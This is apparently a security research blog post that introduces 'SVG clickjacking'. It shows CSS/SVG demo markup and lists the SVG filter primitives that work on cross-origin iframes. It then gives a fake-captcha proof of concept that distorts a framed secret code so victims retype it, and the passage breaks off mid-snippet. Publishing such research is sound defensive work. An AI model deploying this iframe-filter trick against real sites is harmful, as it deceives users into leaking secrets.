+++
title = "SVG clickjacking"
date = 2025-12-04T14:00:00Z
draft = false
tags = ["infosec", "css"]
slug = "svg-clickjacking"
summary = "A novel and powerful twist on an old classic."
+++

*Previously titled: "SVG Filters - Clickjacking 2.0"*

Clickjacking is a classic attack that consists of covering up an iframe of some other website in an attempt to trick the user into unintentionally interacting with it. It works great if you need to trick someone into pressing a button or two, but for anything more complicated it's kind of unrealistic.

I've discovered a new technique that turns classic clickjacking on its head and enables the creation of complex interactive clickjacking attacks, as well as multiple forms of data exfiltration.

I call this technique "**SVG clickjacking**".

<DIV><art-frame id="cover-art" style="background:#715ab5;background:#333;" aria-label="Cover art - a win free iPod dialog is connected to a dangerous permissions dialog behind it" role="img"><div aria-hidden="true"><l-3d>
  <l-target><l-tabs><span style="padding:4px 0;max-height:1lh;vertical-align:middle"><a style="padding:4px;line-height:0" target="_blank" href="https://youtu.be/MSVOhyorGbQ">🦊</a></span><span>File</span><span>Edit</span><span class="viewBtn">View</span><span selected>Share</span><span style="margin-left:auto;opacity:0.3">Lyra Rebane</span></l-tabs>
    <l-body>
<style spellcheck=false contenteditable="plaintext-only">  #cover-art {
    --height: 320px;
    height: var(--height);
    @media (width < 480px) { --height: 260px; };
    font-family: "Open Sans", "Noto Sans", Roboto, system-ui, sans-serif;
    position: relative;
    overflow: hidden;
    font-size: 14px;
    l-target, l-target-menu, l-dialog, l-overlay, l-line, l-dim, l-note {
      display: block;
      border-radius: 8px;
      position: absolute;
    }
    l-target {
      filter: blur(0.75px);
      transform: translateZ(-200px);
      top: -30px;
      left: 59px;
      width: 600px;
      height: 600px;
      background: #FFF;
      overflow: hidden;
      l-body {
        display:block;
        height: 60%;
        overflow: scroll;
        scrollbar-width: none;
        style {
          &::selection {
            background: #000;
            color: #0F0;
          }
          outline: none;
          display: block;
          padding: 10px 0px;
          white-space: pre-wrap;
          color: #AAA;
          font-family: 'Nimbus Mono PS', 'Courier New', monospace;
          font-size: 12px;
        }
      }
      l-tabs {
        padding: 4px;
        border-bottom: 1px solid #DDD;
        background: #EEE;
        display: flex;
        align-items: center;
        gap: 6px;
        span {
          cursor: pointer;
          user-select: none;
          padding: 4px 8px;
          border-radius: 6px;
          &:hover,&[selected] {
            background: #DDD;
          }
          &:active {
            background: #CCC;
          }
        }
      }       
    }
    l-target-menu {
      filter: blur(0.5px);
      transform: translateZ(-175px);
      box-shadow: 12px 12px 20px -10px #0005;
      top: 6px;
      left: 243px;
      background: #FFF;
      width: 100px;
      display: flex;
      flex-direction: column;
      overflow: hidden;
      outline: 1px solid #EEE;
      span {
        padding: 4px 8px;
          cursor: pointer;
          user-select: none;
          &:hover,&[selected] {
            background: #EEE;
          }
          &:active {
            background: #DDD;
          }
      }
    }
    l-dim {
      pointer-events: none;
      transform: translateZ(-130px);
      top: -200px;
      left: -100px;
      width: 1000px;
      height: 1000px;
      background: #0002;
      background: linear-gradient(#000F 50%, #0000 50.001%), linear-gradient(90deg,#000F 50%, #0000 50.001%);
      background: linear-gradient(#00000019 50%, #0001 50.001%);
      rotate: -15deg;
      background-size: 32px 32px;
    }
    l-dialog {
      transform: translateZ(-125px);
      top: 130px;
      left: 226px;
      background: #FFF;
      width: 300px;
      outline: 1px solid #EEE;
      box-shadow: 24px 24px 50px -10px #0005;
      *::selection {
        background: #d3a7d3;
      }
    }
    l-dialog,l-overlay {
      padding: 16px;
      p {
        margin: 0 0 8px;
        b {
          font-size: 120%;
        }
      }
      button {
        --bgBase: #F0F0F0;
        --bg: var(--bgBase);
        background: var(--bg);
        cursor: pointer;
        float: right;
        border-radius: 8px;
        font-size: 100%;
        font-family: inherit;
        padding: 8px 16px;
        margin-left: 6px;
        border: 0;
        color: #000;
        user-select: none;
        &[red] {
          --bgBase: #fb3c3c;
          color: #FFF;
        }
        &[hack] {
          --bgBase: #f70085ee;
          color: #FFF;
        }
        &:hover,&[selected] {
          --bg: hsl(from var(--bgBase) h s calc(l - 8));
        }
        &:active {
          --bg: hsl(from var(--bgBase) h s calc(l - 16));
        }
      }
    }
    l-overlay {
      pointer-events: none;
      top: 108px;
      left: 247px;
      width: 220px;
      height: 66px;
      background: #0003;
      background: linear-gradient(#cd6ab633,#4d038561);
      border: 2px inset #f70085ee;
      outline: 1px solid #5f00f757;
      color: #f70085;
      text-shadow: 1px 1px 2px #a522b1;
      opacity: 1;
      backdrop-filter: blur(0.4px);
      p *::selection {
        background: #FFF;
      }
      button, p {
        pointer-events: all;
      }
      button {
        box-shadow: 1px 1px 2px #a522b1;
        &:active {
          box-shadow: 0 0 1px #a522b1;
          translate: 1px 1px;
        }
      }
    }
    l-line {
      background: red;
      width: 100px;
      height: 10px;
      pointer-events: none;
    }
    l-3d {
      display: block;
      transform-style: preserve-3d;
      transition: transform 2s cubic-bezier(0,0,0,1);
      transform: translateY(calc(var(--height) / -2)) rotate3d(1, -1, 0, 13deg) translateY(-50px) scale(1.25);
      &:hover {
        transform: translateY(calc(var(--height) / -2)) translateZ(10px) rotate3d(1, -1, 0, 10deg) translateY(-50px) scale(1.3);
      }
      &:has(l-overlay button[yesbtn]:hover):not(:has(.viewBtn:active)) {
        transform: translateY(calc(var(--height) / -2)) translateZ(30px) rotate3d(1, -1, 0, 9deg) translateY(-50px) scale(1.3);
      }
      &:has(.viewBtn:active) {
        transition: transform 4s cubic-bezier(0,0,0,1);
        transform: translateY(calc(var(--height) / -2)) translateZ(-130px) rotate3d(1, 0, 0, -40deg) rotate3d(0, 1, 0, -60deg) translateX(-230px) translateY(350px) scale(1.3);
      }
    }
    l-note {
      font-weight: 700;
      text-shadow: 0.5px 1px 1px #000, 1px 2px 6px #ffffff;
      font-size: 18px;font-family: 'Nimbus Mono PS', 'Courier New', monospace;
    }
    &>div {
      width: 768px;
      translate: calc(-50% + 50cqw) calc((var(--height) - 320px) / 3);
      /* we're doing a fun hack here where we transformY to
         center the 3d scene because if i set a height on this
         div instead it'll break mouse events in firefox for
         elements further than 0 in the Z dimension */
      transform: translateY(calc(var(--height) / 2)) scale(1);
      transition: transform 1s cubic-bezier(0,0,0,1), perspective 4s cubic-bezier(0,0,0,1);
      @media (width < 480px) {
        transform: translateY(calc(var(--height) / 2)) scale(0.75);
      }
      transform-style: preserve-3d;
      perspective: 500px;
      &:has(.viewBtn:active) {
        perspective: 700px;
        l-body { height:100%; }
      }
    }
    .yesLine {
      top:172px;
      left:438px;
      width:125px;
      transform-origin: 0 0;
      transform:translateZ(-5px) rotate3d(0.1, 1, 0.3, 57deg) rotate3d(1, 0, 0, -45deg);
      background:#c752bd;
      filter:blur(4px);
      height:16px;
      opacity: 0.75;
      transition: opacity 0.25s, background 0.25s;
    }
    l-target, l-target-menu, l-dialog, l-overlay {
      transition: filter 0.5s;
    }
    &:has(l-target:hover) {
      l-target, l-target-menu {
        filter: none;
      }
      l-dialog {
        filter: blur(0.5px);
      }
      l-overlay {
        filter: blur(0.75px);
      }
    }
    /* ugly linking hack because ff doesn't do style queries or if statements yet */
    &:has(button[yesbtn]:hover) button[yesbtn] {
      --bg: hsl(from var(--bgBase) h s calc(l - 8));
    }
    &:has(button[yesbtn]:active) {
      .yesLine {
        /*background: #f180d3;*/
        background:#f7326b;
        opacity: 1;
      }
      l-overlay button[yesbtn] {
        box-shadow: 0 0 1px #a522b1;
        translate: 1px 1px;
      }
      button[yesbtn] {
        --bg: hsl(from var(--bgBase) h s calc(l - 16));
      }
    }
  }
</style>
    </l-body>
  </l-target>
  <l-target-menu><span>Private</span><a target="_blank" style="color:inherit" href="https://jorianwoltjer.com/blog/p/ctf/openecsc-2025-kittychat-secure"><span style="display:inline-block;width:100%;box-sizing:border-box">Friends</span></a><span>Unlisted</span><span selected>Public</span></l-target-menu>
  <l-dim></l-dim>
  <l-dialog><p><b>Are you sure?</b></p><p>Everybody will be able to see your secrets.</p><button red yesbtn>Yes</button><button>No</button></l-dialog>
  <l-note style="color:#FB3C3C;top: 29px;left:261px;transform: translateZ(-125px) rotate3d(1, -1, 0, -13deg);">[ get pixel color at (567,178) ]</l-note>
  <l-line style="top: 56px;left: 533px;border-radius: 0;transform-origin:0 0;transform: translateZ(-125px) rotate(92deg);height: 2px;width: 148px;"></l-line>
  <l-overlay><p><b>win free ipod</b></p><button hack yesbtn>click here</button></l-overlay>
  <l-line class="yesLine"></l-line>
  <l-note style="color:#F30A8A;top: 243px;left: 230px;transform: rotate3d(1, -1, 0, -13deg);">[ show overlay image #3 ]</l-note>
  <l-line style="background:#F30A8A;top: 208px;left: 344px;border-radius: 0;transform-origin:0 0;transform: rotate(89deg);height: 3px;width: 36px;"></l-line>
</l-3d></div></art-frame></DIV>

<!--
## Adjust until barely visible

Before we get onto the rest of the blog post I'll stop you here for a quick compatibility check. <fx-strike>You should be seeing a pony here -\> [].</fx-strike><fx-off> (the pony is hidden because svg effects are disabled)</fx-off>

If you don't see the pony, or you're having performance issues, disable the SVG effects and the blog post falls back to CSS emulations of said effects.

<label><input type="checkbox" checked name="fx" id="fx"> SVG effects</label>

SVG effects are currently <b><fx-on style="color:green">enabled</fx-on><fx-off style="color:red">disabled</fx-off></b>. 

<style>
  body:has(#fx:checked) {
    fx-off {
      display: none;
      visibility: none;
    }
  }
  body:has(#fx:not(:checked)) {
    fx-on {
      display: none;
      visibility: none;
    }
    fx-strike {
      text-decoration: line-through;
    }
  }
</style>
-->
<div style="height:1em"></div>
<style>
    .safariNote {
      font-style: italic;
      span { display: none; }
      /* CSS-only Safari Detection (stackoverflow.com/a/74381245/2251833/) */
      @supports (font: -apple-system-body) and (-webkit-appearance: none) {
        color: red;
        span { display: unset; }
      }
    }
    pre > code {
      white-space: pre-wrap;
    }
    .sx-block {
      color-scheme: dark;
      color: #EEE;
      &::selection, ::selection {
        background: #004A77;
      }
    }
    .sx-block {
      background: #15202B;
      max-width: 100%;
      overflow: clip;
      border-radius: 4px;
      & > code {
        max-width: 100%;
        overflow-x: auto;
        display: block;
        padding: 10px;
        color: inherit;
        font-family: var(--font-code);
        font-size: 0.8125rem;
      }
      &:not(.sx-full) {
        width: fit-content;
      }
    }
    sx-r { color: #A8C7FA; }
    sx-v { color: #FE8D59; }
    sx-t { color: #7CACF8; }
    sx-c { color: #ABABAB; }
</style>

<!--## Liquid glaCSS-->
## Liquid SVGs

The day Apple announced its new Liquid Glass redesign was pretty chaotic. You couldn't go on social media without every other post being about the new design, whether it was critique over how inaccessible it seemed, or awe at how realistic the refraction effects were.

Drowning in the flurry of posts, a thought came to mind - how hard would it be to re-create this effect? Could I do this, on the web, without resorting to canvas and shaders? I got to work, and about an hour later I had [a pretty accurate CSS/SVG recreation of the effect](https://codepen.io/rebane2001/details/OPVQXMv)[^codepen].

  <style>
    .force-visibility {
      @supports (animation-range: entry exit) {
        view-timeline-name: --force-visibility;
        view-timeline-axis: block;

        animation: linear force-visibility both;
        animation-timeline: --force-visibility;
        animation-range: entry exit;
      }
    }
    @keyframes force-visibility {
      from {
        content-visibility:hidden;
      }
      0.001% {
        content-visibility:auto;
      }
      100% {
        content-visibility:auto;
      }
      to {
        content-visibility:hidden;
      }
    }</style>
<DIV><art-frame id="lGlassDemo" style="height:300px;position:relative;contain: strict" role=img aria-label="A few album arts with a movable liquid glass effect on top">
<div style="position:absolute;width:300px;height:200px">
  <div style="width:768px;height:300px" class="liquidDemoBg">
    <div>
    <album-card><a target="_blank" href="https://visualdisturbances.bandcamp.com/album/emergency-2"><div style="background:linear-gradient(#040758,#052297)"></div><p>EMERGENCY!</p><p>Girls Rituals</p></a></album-card>
    <album-card><a target="_blank" href="https://acloudyskye.bandcamp.com/album/this-wont-be-the-last-time"><div style="background:linear-gradient(-135deg,#0C9FF0,#0000 25%), linear-gradient(135deg,#0C9FF0,#0000 25%), linear-gradient(in oklch,#FFF,#FFF,#FFF,#BD3242)"></div><p>This Won't Be The Last Time</p><p>acloudyskye</p></a></album-card>
    <album-card><a target="_blank" href="https://soundbandit.bandcamp.com/album/sound-bandit-fucking-lives"><div style="background:radial-gradient(in oklch, #F8C6AD,#F9E234,#CDCA01)/*radial-gradient(circle at 50% 95%,#ECAB91, #F3A98C 10%,#0000 16%),radial-gradient(circle at 50% 50%,#ECAB91, #F3A98C 50%,#0000 60%),radial-gradient(circle at 45% 48%,#0000 40%, #666A09,#F4C72E,#E45626,#0000 54%),  radial-gradient(circle at 50% 50%,#F7B85C,#7A582B)*/"></div><p>SOUND BANDIT FUCKING LIVES</p><p>Sound Bandit</p></a></album-card>
    <album-card><a target="_blank" href="https://vyletpony.bandcamp.com/album/love-ponystep"><div style="background:linear-gradient(0deg,#0003,#0000 20%),linear-gradient(90deg,#0003,#0000 20%),linear-gradient(180deg,#0003,#0000 20%),linear-gradient(270deg,#0003,#0000 20%),linear-gradient(180deg,#FF0213,#D85C13,#C472B2,#AD2DA8,#A51866),linear-gradient(in oklch 180deg,#9E4CA2,#B41C35)"></div><p>Love & Ponystep</p><p>Vylet Pony</p></a></album-card>
    <album-card><a target="_blank" href="https://ninajirachi.bandcamp.com/album/i-love-my-computer"><div style="background:linear-gradient(#D5D6D3,#8691AA)"></div><p>I Love My Computer</p><p>Ninajirachi</p></a></album-card>
    </div>
    <div style="position:relative">
    <album-card title="mom - 3"><a target="_blank" href="https://blacksquares.bandcamp.com/album/3"><div style="background:radial-gradient(circle at 53% 50%, #EA01FD 30%, #0000 40%),radial-gradient(circle at 47% 50%, #080CFF 30%, #0000 40%),linear-gradient(#FFF600,#FFF600)"></div></a></album-card>
    <album-card title="glass beach - the first glass beach album"><a target="_blank" href="https://glassbeach.bandcamp.com/album/the-first-glass-beach-album"><div style="background:radial-gradient(circle at 73% 16%, #CB1629 9%,#0000 10%), linear-gradient(#0F1015 38%,#038D8F 39%)"></div></a></album-card>
    <album-card title="underscores - wallsocket (director's cut)"><a target="_blank" href="https://underscores.bandcamp.com/album/wallsocket-directors-cut"><div style="background:radial-gradient(circle at 16% 40%, #7B7368, #0000 15%),linear-gradient(in oklch 181deg, #C38765,#F35C01 50%,#150F04 50.5%, #667D00 51%)"></div></a></album-card>
    <album-card title="patricia taxxon - bicycle"><a target="_blank" href="https://patriciataxxon.bandcamp.com/album/bicycle"><div style="background:linear-gradient(#ECD963 9%, #0000 10%),linear-gradient(90deg, #ECD963 9%, #0000 10%),linear-gradient(-90deg, #ECD963 9%, #0000 10%), linear-gradient(#C3CF8F 10%,#9E9948 90%)"></div></a></album-card>
    <album-card title="yaeji - ep 1+2"><a target="_blank" href="https://kraejiyaeji.bandcamp.com/album/ep-1-2"><div style="background:linear-gradient(in oklch, #ECA395,#527796)"></div></a></album-card>
    <div style="position:absolute;pointer-events:none;inset:0 0 -150px 0;backdrop-filter:blur(2px);mask-image:linear-gradient(#0000, #FFF 25%);"></div>
    <div style="position:absolute;pointer-events:none;inset:0 0 -150px 0;backdrop-filter:blur(3px);mask-image:linear-gradient(#0000, #FFF 50%);"></div>
    <div style="position:absolute;pointer-events:none;inset:0 0 -150px 0;backdrop-filter:blur(4px);mask-image:linear-gradient(#0000, #FFF 75%);"></div>
    <div style="position:absolute;pointer-events:none;inset:0 0 -150px 0;backdrop-filter:blur(8px);mask-image:linear-gradient(#0000, #FFF 100%);"></div>
    </div>
  </div>
</div>
<div id="liquidOverlay" class="force-visibility" style="clip-path: rect(calc(100% - 120px) 100% 100% calc(100% - 120px));position:absolute;translate:-190px -190px;min-width:200px;min-height:200px;max-width:calc(192px + 100cqw);max-height:490px;container-type:size;resize:both;overflow:auto;display:flex;justify-content: flex-end;align-items: flex-end;width:min(547px,calc(300px + 50cqw));height:383px;border-right:10px solid #0000;border-bottom:10px solid #0000"><div id="liquidResize"></div><div style="filter:url(#displacementFilter4);width:200px;height:200px;overflow:clip;background:#FFF">
  <div style="width:768px;height:300px;translate:calc(390px - 100cqw) calc(390px - 100cqh);pointer-events:none;user-select:none" class="liquidDemoBg">
    <div>
    <album-card><div style="background:linear-gradient(#040758,#052297)"></div><p>EMERGENCY!</p><p>Girls Rituals</p></album-card>
    <album-card><div style="background:linear-gradient(-135deg,#0C9FF0,#0000 25%), linear-gradient(135deg,#0C9FF0,#0000 25%), linear-gradient(in oklch,#FFF,#FFF,#FFF,#BD3242)"></div><p>This Won't Be The Last Time</p><p>acloudyskye</p></album-card>
    <album-card><div style="background:radial-gradient(in oklch, #F8C6AD,#F9E234,#CDCA01)"></div><p>SOUND BANDIT FUCKING LIVES</p><p>Sound Bandit</p></album-card>
    <album-card><div style="background:linear-gradient(0deg,#0003,#0000 20%),linear-gradient(90deg,#0003,#0000 20%),linear-gradient(180deg,#0003,#0000 20%),linear-gradient(270deg,#0003,#0000 20%),linear-gradient(180deg,#FF0213,#D85C13,#C472B2,#AD2DA8,#A51866),linear-gradient(in oklch 180deg,#9E4CA2,#B41C35)"></div><p>Love & Ponystep</p><p>Vylet Pony</p></album-card>
    <album-card><div style="background:linear-gradient(#D5D6D3,#8691AA)"></div><p>I Love My Computer</p><p>Ninajirachi</p></album-card>
    </div>
    <div style="position:relative">
    <album-card><div style="background:radial-gradient(circle at 53% 50%, #EA01FD 30%, #0000 40%),radial-gradient(circle at 47% 50%, #080CFF 30%, #0000 40%),linear-gradient(#FFF600,#FFF600)"></div></album-card>
    <album-card><div style="background:radial-gradient(circle at 73% 16%, #CB1629 9%,#0000 10%), linear-gradient(#0F1015 38%,#038D8F 39%)"></div></album-card>
    <album-card><div style="background:radial-gradient(circle at 16% 40%, #7B7368, #0000 15%),linear-gradient(in oklch 181deg, #C38765,#F35C01 50%,#150F04 50.5%, #667D00 51%)"></div></album-card>
    <album-card><div style="background:linear-gradient(#ECD963 9%, #0000 10%),linear-gradient(90deg, #ECD963 9%, #0000 10%),linear-gradient(-90deg, #ECD963 9%, #0000 10%), linear-gradient(#C3CF8F 10%,#9E9948 90%)"></div></album-card>
    <album-card><div style="background:linear-gradient(in oklch, #ECA395,#527796)"></div></album-card>
    <div style="position:absolute;pointer-events:none;inset:0 0 -150px 0;backdrop-filter:blur(2px);mask-image:linear-gradient(#0000, #FFF 25%);"></div>
    <div style="position:absolute;pointer-events:none;inset:0 0 -150px 0;backdrop-filter:blur(3px);mask-image:linear-gradient(#0000, #FFF 50%);"></div>
    <div style="position:absolute;pointer-events:none;inset:0 0 -150px 0;backdrop-filter:blur(4px);mask-image:linear-gradient(#0000, #FFF 75%);"></div>
    <div style="position:absolute;pointer-events:none;inset:0 0 -150px 0;backdrop-filter:blur(8px);mask-image:linear-gradient(#0000, #FFF 100%);"></div>
    </div>
  </div>
  </div>
</div></div>
<!-- <p id="dragMsg" style="position:absolute;bottom:0px;left:50%;translate: -50% 0; background:#FFFA;padding:8px;border-radius:5px;text-align:center;pointer-events:none">Drag the liquid glass effect around from the bottom-right handle.</p> -->
</art-frame></DIV>

<style>
  #dragMsg {
    transition: opacity 0.2s;
    opacity: 0;
  }
  #lGlassDemo:hover:has(#liquidOverlay:not(:hover)) {
    #dragMsg {
      transition: opacity 0.2s 0.2s;
      opacity: 1;
    }
  }
  #liquidResize {
    position:absolute;
    width:8px;
    height:8px;
    border-radius:8px;
    background:#FFF;
    outline:2px solid #222;
    outline-offset:-2px;
    zoom:1.5;
    pointer-events: none;
    opacity: 1;
  }
  @media (pointer: coarse) {
    #liquidOverlay {
      scale: 4;
      transform-origin: 100% 100%;
      & > div {
        scale: 0.25;
        transform-origin: 100% 100%;
      }
    }
    #liquidResize {
      opacity: 1;
      outline:2px solid #222;
      zoom:2;
    }
    .fineText { display:none }
  }
  @media not (pointer: coarse) {
    .coarseText { display:none }
  }
  .liquidDemoBg {
    display:flex;
    flex-direction: column;
    background:linear-gradient(180deg,#FEFEFE 70%,#8CFFDB);
    & > div {
      justify-content: space-evenly;
      display:flex;
      flex:1;
    }
    album-card {
      margin-top:12px;
      max-width: 140px;
      font-size: 75%;
      font-family: sans-serif;
      a {
        color: inherit;
      }
      & > div, & > a > div {
        width: 140px;
        height: 140px;
      }
      p {
        font-weight: 600;
        margin:0;
      }
      p:last-child {
        font-weight: 400;
      }
    }
    img {
      width: 140px;
      height: 140px;
    }
  }
</style>

<svg class="effect" width="200" height="200" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
<filter id="displacementFilter4">
    <feImage xlink:href="data:image/svg+xml,%3Csvg width='200' height='200' viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='50' y='50' width='100' height='100' rx='26' fill='rgb%280 0 0 %2F7%25%29' /%3E%3Crect x='50' y='50' width='100' height='100' rx='26' fill='%23FFF' style='filter:blur(5px)' /%3E%3C/svg%3E" x="0%" y="0%" width="100%" height="100%" result="thing9" id="thing9"></feImage>
    <feImage xlink:href="data:image/svg+xml,%3Csvg width='200' height='200' viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='50' y='50' width='100' height='100' rx='26' fill='%23000' /%3E%3C/svg%3E" x="0%" y="0%" width="100%" height="100%" result="thing1" id="thing1"></feImage>
    <feImage xlink:href="data:image/svg+xml,%3Csvg width='200' height='200' viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3ClinearGradient id='gradient1' x1='0%25' y1='0%25' x2='100%25' y2='0%25'%3E%3Cstop offset='0%25' stop-color='%23000'/%3E%3Cstop offset='100%25' stop-color='%2300F'/%3E%3C/linearGradient%3E%3ClinearGradient id='gradient2' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23000'/%3E%3Cstop offset='100%25' stop-color='%230F0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect x='0' y='0' width='200' height='200' rx='26' fill='%237F7F7F' /%3E%3Crect x='50' y='50' width='100' height='100' rx='26' fill='%23000' /%3E%3Crect x='50' y='50' width='100' height='100' rx='26' fill='url(%23gradient1)' style='mix-blend-mode: screen' /%3E%3Crect x='50' y='50' width='100' height='100' rx='26' fill='url(%23gradient2)' style='mix-blend-mode: screen' /%3E%3Crect x='50' y='50' width='100' height='100' rx='26' fill='rgb%28127 127 127 %2F85%25%29' style='filter:blur(4px)' /%3E%3C/svg%3E" x="0%" y="0%" width="100%" height="100%" result="thing2" id="thing2"></feImage>
      <feGaussianBlur stdDeviation=".6" id="preblur" in="SourceGraphic" result="preblur"></feGaussianBlur>
    <feDisplacementMap id="dispR" in2="thing2" in="preblur" scale="-146.5" xChannelSelector="B" yChannelSelector="G"></feDisplacementMap>
      <feColorMatrix type="matrix" values="1 0 0 0 0
              0 0 0 0 0
              0 0 0 0 0
              0 0 0 1 0" result="disp1"></feColorMatrix>
    <feDisplacementMap id="dispG" in2="thing2" in="preblur" scale="-150" xChannelSelector="B" yChannelSelector="G"></feDisplacementMap>
      <feColorMatrix type="matrix" values="0 0 0 0 0
              0 1 0 0 0
              0 0 0 0 0
              0 0 0 1 0" result="disp2"></feColorMatrix>
    <feDisplacementMap id="dispB" in2="thing2" in="preblur" scale="-153.5" xChannelSelector="B" yChannelSelector="G"></feDisplacementMap>
      <feColorMatrix type="matrix" values="0 0 0 0 0
              0 0 0 0 0
              0 0 1 0 0
              0 0 0 1 0" result="disp3"></feColorMatrix>
      <feBlend in2="disp2" mode="screen"></feBlend>
      <feBlend in2="disp1" mode="screen"></feBlend>
      <feGaussianBlur stdDeviation="1.3" id="postblur"></feGaussianBlur>
      <feBlend in2="thing9" mode="multiply"></feBlend>
      <feComposite in2="thing1" operator="in"></feComposite>
      <feOffset dx="43" dy="43"></feOffset>
  </filter>
</svg>

*You can drag around the effect with the <span id="liquidResize" style="position:static;zoom:1.5;display:inline-block;transform:skewX(-9deg) scaleX(0.95) translateX(0.4px);pointer-events:all;cursor:text"><span style="font-size:0;position:absolute;">bottom-right circle control thing</span></span> in the demo above (chrome/firefox desktop, chrome mobile).*

<div class="safariNote"><span>Note: This demo is broken in Safari, sorry.</span></div>

My little tech demo made quite a splash online, and even resulted in a [news article](https://80.lv/articles/accurate-apple-s-liquid-glass-effect-recreated-with-css-svg) with what is probably the wildest quote about me to date: *"Samsung and others have nothing on her"*.

A few days passed, and another thought came to mind - would this SVG effect work on top of an iframe?

Like, surely not? The way the effect "refracts light"[^refract] is way too complex to work on a cross-origin document.

But, to my surprise, it did.

The reason this was so interesting to me is that my liquid glass effect uses the `feColorMatrix` and `feDisplacementMap` SVG filters - changing the colors of pixels, and moving them, respectively. And I could do that on a cross-origin document?

This got me wondering - do any of the other filters work on iframes, and could we turn that into an attack somehow? It turns out that it's <!--nearly -->all of them, and yes!

## Building blocks

I got to work, going through every [\<fe*>](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element#f) SVG element and figuring out which ones can be combined to build our own attack primitives.

These filter elements take in one or more input images, apply operations to them, and output a new image. You can chain a bunch of them together within a single SVG filter, and refer to the output of any of the previous filter elements in the chain.

Let's take a look at some of the more useful base elements we can play with:

- [**\<feImage>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feImage) - load an image file;
- [**\<feFlood>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feFlood) - draw a rectangle;
- [**\<feOffset>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feOffset) - move stuff around;
- [**\<feDisplacementMap>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feDisplacementMap) - move pixels according to a map;
- [**\<feGaussianBlur>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feGaussianBlur) - blur stuff;
- [**\<feTile>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feTile) - tiling and cropping utility;
- [**\<feMorphology>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feMorphology) - expand/grow light or dark areas;
- [**\<feBlend>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feBlend) - blend two inputs according to the [mode](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode);
- [**\<feComposite>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feComposite) - compositing utilities, can be used to apply an alpha matte, or do various arithmetics on one or two inputs;
- [**\<feColorMatrix>**](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feColorMatrix) - apply a color matrix, this allows moving colors between channels and converting between alpha and luma mattes;

That's quite a selection of utilities!

If you're a demoscener[^aefx] you're probably feeling right at home. These are  the fundamental building blocks for many kinds of computer graphics, and they can be combined into many useful primitives of our own. So let's see some examples.

### Fake captcha

I'll start off with an example of basic data exfiltration. Suppose you're targeting an iframe that contains some sort of sensitive code. You *could* ask the user to retype it by itself, but that'd probably seem suspicious.

What we can do instead is make use of `feDisplacementMap` to make the text seem like a captcha! This way, the user is far more likely to retype the code.

<DIV><art-frame id="fakeCaptcha" flex><fake-frame><p>Here is your secret code:</p><p>6c79 7261 706f 6e79</p><p>Don't share it with anyone!</p></fake-frame><fake-frame style="filter:url(#fakeCaptchaFilter)"><p>Here is your secret code:</p><p>6c79 7261 706f 6e79</p><p>Don't share it with anyone!</p></fake-frame><div><div style="margin-top:20px;background:#EEE;padding:10px 0;text-align:center">Complete a captcha</div><div style="margin-top:70px;background:#EEE;padding:10px 0;text-align:center"><div class="textA">What's written above?</div><div class="textB" contenteditable="plaintext-only" style="color:green">Good girl!!<br><p style="font-size:50%;margin:0;color:#444">(<span class="coarseText">tap</span><span class="fineText">click</span> to edit if you're not a girl)</p></div><input spellcheck=false placeholder="Enter the letters from above" minlength="16" pattern="^6c79 ?7261 ?706f ?6e79$" required></div></div></art-frame></DIV>

<pre class="sx-block sx-full"><code><sx-t>&lt;iframe</sx-t> <sx-r>src</sx-r><sx-t>=</sx-t><sx-v>&quot;...&quot;</sx-v> <sx-r>style</sx-r><sx-t>=</sx-t><sx-v>&quot;filter:url(#captchaFilter)&quot;</sx-v><sx-t>&gt;&lt;/iframe&gt;
&lt;svg</sx-t> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;768&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;768&quot;</sx-v> <sx-r>viewBox</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 768 768&quot;</sx-v> <sx-r>xmlns</sx-r><sx-t>=</sx-t><sx-v>&quot;http://www.w3.org/2000/svg&quot;</sx-v><sx-t>&gt;
  &lt;filter</sx-t> <sx-r>id</sx-r><sx-t>=</sx-t><sx-v>&quot;captchaFilter&quot;</sx-v><sx-t>&gt;
    &lt;feTurbulence</sx-t>
      <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>&quot;turbulence&quot;</sx-v>
      <sx-r>baseFrequency</sx-r><sx-t>=</sx-t><sx-v>&quot;0.03&quot;</sx-v>
      <sx-r>numOctaves</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v>
      <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>&quot;turbulence&quot;</sx-v> <sx-t>/&gt;
    &lt;feDisplacementMap</sx-t>
      <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>&quot;SourceGraphic&quot;</sx-v>
      <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>&quot;turbulence&quot;</sx-v>
      <sx-r>scale</sx-r><sx-t>=</sx-t><sx-v>&quot;6&quot;</sx-v>
      <sx-r>xChannelSelector</sx-r><sx-t>=</sx-t><sx-v>&quot;R&quot;</sx-v>
      <sx-r>yChannelSelector</sx-r><sx-t>=</sx-t><sx-v>&quot;G&quot;</sx-v> <sx-t>/&gt;
  &lt;/filter&gt;
&lt;/svg&gt;</sx-t>
</code></pre>

<svg
  class="effect"
  width="768"
  height="768"
  viewBox="0 0 768 768"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="fakeCaptchaFilter">
      <feTurbulence
        type="turbulence"
        baseFrequency="0.03"
        numOctaves="4"
